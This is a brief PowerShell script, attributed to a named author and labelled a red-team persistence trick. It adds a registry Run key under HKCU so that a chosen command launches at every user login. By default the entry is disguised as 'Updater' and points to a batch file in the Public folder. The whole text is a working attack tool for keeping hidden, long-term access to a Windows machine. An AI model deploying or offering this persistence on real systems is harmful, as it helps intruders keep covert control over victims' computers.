<#
.SYNOPSIS
  Adds persistence via registry Run key.

.DESCRIPTION
  Adds a specified command to run at every user login via HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
  Common Red Team persistence trick.

.AUTHOR
  Viral Maniar
#>

param (
    [string]$Name = "Updater",
    [string]$Command = "C:\Users\Public\updater.bat"
)

$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RegPath -Name $Name -Value $Command

Write-Host "Persistence added: $Name -> $Command"
